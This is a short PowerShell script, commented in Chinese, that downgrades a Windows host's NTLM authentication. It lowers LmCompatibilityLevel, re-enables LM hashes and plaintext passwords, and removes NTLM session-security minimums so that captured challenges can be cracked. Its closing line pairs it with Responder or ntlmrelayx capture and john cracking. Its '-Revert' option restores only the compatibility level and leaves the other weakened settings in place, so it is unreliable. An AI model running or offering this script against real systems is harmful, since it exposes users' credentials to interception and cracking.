# ntlm_downgrade.ps1 —— NTLM 降级配置（让抓到的挑战可被 CPU 快速破解）
param([ValidateSet(0,1,2,3,4,5)][int]$Level = 2, [switch]$Revert)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators')) {
    Write-Host '[!] 需要管理员权限'; exit 1
}
$lsa = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$msv = "$lsa\MSV1_0"
if ($Revert) { $Level = 5 }
Set-ItemProperty $lsa LmCompatibilityLevel $Level
Set-ItemProperty $lsa NoLmHash 0
Set-ItemProperty $msv NtlmMinClientSec 0
Set-ItemProperty $msv NtlmMinServerSec 0
Set-ItemProperty $msv RestrictSendingNTLMTraffic 0
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters' EnablePlainTextPassword 1
$msg = @{
 0 = '发送 LM & NTLM 响应（最弱，NTLMv1 可秒破）'
 1 = '发送 LM & NTLM, 使用 NTLMv2 会话安全'
 2 = '仅发送 NTLM 响应（NTLMv1，可破解）'
 3 = '仅发送 NTLMv2 响应（默认）'
 4 = '仅发送 NTLMv2, 拒绝 LM'
 5 = '仅发送 NTLMv2, 拒绝 LM & NTLM（最严）'
}[$Level]
Write-Host "[+] LmCompatibilityLevel = $Level -> $msg"
Write-Host '[i] 重启生效: Restart-Computer -Force'
Write-Host '[i] 配合 responder/ntlmrelayx 抓 NTLMv1，john --format=netntlm 破解'
